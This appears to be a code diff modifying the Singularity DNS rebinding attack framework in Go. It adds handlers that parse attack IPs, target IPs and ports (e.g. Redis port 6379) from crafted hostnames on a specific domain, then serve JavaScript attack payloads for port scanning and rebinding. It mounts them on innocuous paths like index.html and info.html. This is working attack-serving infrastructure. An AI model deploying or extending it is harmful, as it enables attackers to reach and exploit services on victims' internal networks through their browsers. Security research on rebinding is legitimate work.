@@ -20,6 +20,7 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"regexp"
 
 	"github.com/miekg/dns"
 	"github.com/nccgroup/singularity/golang"
@@ -411,6 +412,27 @@ type PayloadTemplateHandler struct {
 
 type templatePayloadData struct {
 	JavaScriptCode template.JS
+	PayloadJSCode  template.JS
+}
+
+type PsmTemplateHandler struct {
+}
+
+type PsmPayloadData struct {
+	JavaScriptCode template.JS
+	TargetIp       string
+	TargetPortSpec string
+}
+
+type OepTemplateHandler struct {
+}
+
+type OepPayloadData struct {
+	Interval	string
+	AttackIp	string
+	AttackDomain	string
+	TargetPort	string
+	JSCode		template.JS
 }
 
 // HTTPServerStoreHandler holds the list of HTTP servers
@@ -477,6 +499,16 @@ func (hcih *HTTPClientInfoHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 	}
 }
 
+func concatenateJSFromFile(filePath string) string {
+    // 从文件中读取 JavaScript 代码
+    content, err := ioutil.ReadFile(filePath)
+    if err != nil {
+        return ""
+    }
+    // 将文件内容作为字符串返回
+    return string(content)
+}
+
 // https://siongui.github.io/2016/03/06/go-concatenate-js-files/
 func concatenateJS(dirPath string) []byte {
 	var jsCode []byte
@@ -500,7 +532,7 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
 
 	const tpl = `<!doctype html>
-	<html><head><title>Attack Frame</title><script src="payload.js"></script>
+	<html><head><title>Attack Frame</title>
 	<script>
 	{{ .JavaScriptCode }}
 
@@ -529,9 +561,10 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 		}
 	}
 	</script></head>
-	<body onload="begin('/')")><h3 id='title'>Rebinding...</h3>
+	<body><h3 id='title'>Rebinding...</h3>
 	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span>
 	<span id='payloadstatus'></span></p>
+	<script>{{ .PayloadJSCode }}</script>
 	</body></html>`
 
 	t, err := template.New("webpage").Parse(tpl)
@@ -540,7 +573,79 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 		http.Error(w, "Bad request", http.StatusBadRequest)
 		return
 	}
-	templateData := templatePayloadData{JavaScriptCode: template.JS(concatenateJS("html/payloads"))}
+	templateData := templatePayloadData{JavaScriptCode: template.JS(concatenateJS("html/payloads")), PayloadJSCode: template.JS(concatenateJSFromFile("html/payload.js"))}
+	err = t.Execute(w, templateData)
+	if err != nil {
+		log.Printf("PayloadTemplateHandler: could not execute template: %v\n", err)
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+}
+
+// HTTP Handler for "/oep"
+func (oep *OepTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
+	// http://s-1.1.1.1-0.0.0.0-6379-2-7893485-ma-dnsbind-e.haihao.info:8080/oep.html
+	// http://s-%1-%2-%3-%4-%5-%6-%7-e.%8:%9/%10
+	reqHost := r.Host
+	re := regexp.MustCompile(`s-(\d+\.\d+\.\d+\.\d+)-(\d+\.\d+\.\d+\.\d+)-(\d+)-(\d+)-(\d+)-(\w+)-(\w+)-e.(\w+\.\w+):(\d+)`)
+	matches := re.FindStringSubmatch(reqHost)
+	if len(matches) == 0 {
+		log.Printf("Parse Host failed: %v\n", r.Host)
+		http.Error(w, "Bad request: Host", http.StatusBadRequest)
+		return
+	}
+	attackIp := matches[1]
+	targetPort := matches[3]
+	interval := matches[4]
+	// randomInt := matches[5]
+	// dnsType := matches[6]
+	attackDomain := matches[7] + "." + matches[8]
+
+	log.Printf("attackIp: %v, targetPort: %v, interval: %v, attackDomain: %v\n", attackIp, targetPort, interval, attackDomain)
+
+	t, err := template.ParseFiles("html/oep.html")
+	if err != nil {
+		log.Printf("PayloadTemplateHandler: could not parse template: %v\n", err)
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+
+	templateData := OepPayloadData{Interval: interval, AttackIp: attackIp, AttackDomain: attackDomain, TargetPort: targetPort, JSCode: template.JS(concatenateJSFromFile("html/manager.js")) }
+	err = t.Execute(w, templateData)
+	if err != nil {
+		log.Printf("PayloadTemplateHandler: could not execute template: %v\n", err)
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+}
+
+// HTTP Handler for "/psm"
+func (psm *PsmTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
+	// http://s-0.0.0.0-1000-6379-89765-e.haihao.info:8080/psm.html
+	// http://s-%1-%2-%3-%4-e.%8:%9/%10
+	reqHost := r.Host
+	re := regexp.MustCompile(`s-(\d+\.\d+\.\d+\.\d+)-(\d+)-(\d+)-(\d+)-e.(\w+\.\w+):(\d+)`)
+	matches := re.FindStringSubmatch(reqHost)
+	if len(matches) == 0 {
+		log.Printf("Parse Host failed: %v\n", r.Host)
+		http.Error(w, "Bad request: Host", http.StatusBadRequest)
+		return
+	}
+	targetIp := matches[1]
+	targetPortSpec := matches[2] + "-" + matches[3]
+
+	log.Printf("targetIp: %v, targetPortSpec: %v", targetIp, targetPortSpec)
+
+	t, err := template.ParseFiles("html/psm.html")
+	if err != nil {
+		log.Printf("PayloadTemplateHandler: could not parse template: %v\n", err)
+		http.Error(w, "Bad request", http.StatusBadRequest)
+		return
+	}
+
+	templateData := PsmPayloadData{TargetIp: targetIp, TargetPortSpec: targetPortSpec, JavaScriptCode: template.JS(concatenateJSFromFile("html/psm.js")) }
 	err = t.Execute(w, templateData)
 	if err != nil {
 		log.Printf("PayloadTemplateHandler: could not execute template: %v\n", err)
@@ -727,6 +832,10 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	hcih := &HTTPClientInfoHandler{}
 	pth := &PayloadTemplateHandler{}
 	dpth := &DefaultHeadersHandler{NextHandler: pth}
+	oep := &OepTemplateHandler{}
+	doep := &DefaultHeadersHandler{NextHandler: oep}
+	psm := &PsmTemplateHandler{}
+	dpsm := &DefaultHeadersHandler{NextHandler: psm}
 	ipth := &IPTablesHandler{}
 	delayDOMLoadHandler := &DelayDOMLoadHandler{}
 	//websocketHandler := &WebsocketHandler{dcss: dcss, wscss: wscss}
@@ -779,6 +888,8 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 
 	h.Handle("/clientinfo", hcih)
 	h.Handle("/soopayload.html", dpth)
+	h.Handle("/index.html", doep)
+	h.Handle("/info.html", dpsm)
 	h.Handle("/servers", hss)
 	h.Handle("/delaydomload", delayDOMLoadHandler)
 	//h.Handle("/soows", websocketHandler)
@@ -819,9 +930,9 @@ func StartHTTPServer(s *http.Server, hss *HTTPServerStoreHandler, dynamic bool, 
 
 	if tproxy == true {
 		listenConfig := &net.ListenConfig{Control: useIPTransparent}
-		l, err = listenConfig.Listen(context.Background(), "tcp", s.Addr)
+		l, err = listenConfig.Listen(context.Background(), "tcp4", s.Addr)
 	} else {
-		l, err = net.Listen("tcp", s.Addr)
+		l, err = net.Listen("tcp4", s.Addr)
 	}
 	if err != nil {
 		return err
